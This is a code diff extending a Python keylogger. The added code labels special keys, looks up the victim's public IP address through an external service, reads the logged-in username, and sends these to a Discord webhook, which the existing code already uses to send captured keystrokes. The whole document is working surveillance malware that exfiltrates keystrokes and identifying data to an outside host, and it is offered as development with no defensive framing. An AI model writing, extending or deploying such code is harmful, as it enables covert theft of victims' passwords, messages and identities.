@@ -12,6 +12,31 @@ keystrokes = ""
 lock = threading.Lock()
 last_keypress_time = time.time()
 
+# Dictionary for special keys
+special_keys = {
+    keyboard.Key.space: " SPACE ",
+    keyboard.Key.enter: " ENTER ",
+    keyboard.Key.backspace: " BACKSPACE ",
+    keyboard.Key.tab: " TAB ",
+    keyboard.Key.shift: " SHIFT ",
+    keyboard.Key.ctrl_l: " CTRL ",
+    keyboard.Key.alt_l: " ALT ",
+    keyboard.Key.cmd: " CMD ",
+    keyboard.Key.esc: " ESC ",
+}
+
+def get_public_ip():
+    """Fetch the public IP address using an external API."""
+    try:
+        response = requests.get('https://api.ipify.org?format=json')
+        if response.status_code == 200:
+            return response.json().get("ip")
+        else:
+            return "Unknown"
+    except Exception as e:
+        print(f"Error getting public IP address: {e}")
+        return "Unknown"
+
 def send_to_webhook(message):
     """Send the message to the Discord webhook."""
     payload = {"content": message}
@@ -39,7 +64,7 @@ def on_press(key):
     try:
         key_str = key.char
     except AttributeError:
-        key_str = f"[{key}]"
+        key_str = special_keys.get(key, f"[{key}]")
     
     with lock:
         keystrokes += key_str
@@ -47,8 +72,14 @@ def on_press(key):
 
 def on_release(key):
     if key == keyboard.Key.delete:
-        send_to_webhook("Connection stopped by user.")
+        send_to_webhook(f"Connection stopped by user: {username}")
         return False
+
+# Get and send public IP and username
+username = os.getlogin()
+public_ip = get_public_ip()
+send_to_webhook(f"Connection established. Public IP address: {public_ip}")
+send_to_webhook(f"Current user: {username}")
 
 # Start the keystroke monitor thread
 threading.Thread(target=keystroke_monitor, daemon=True).start()
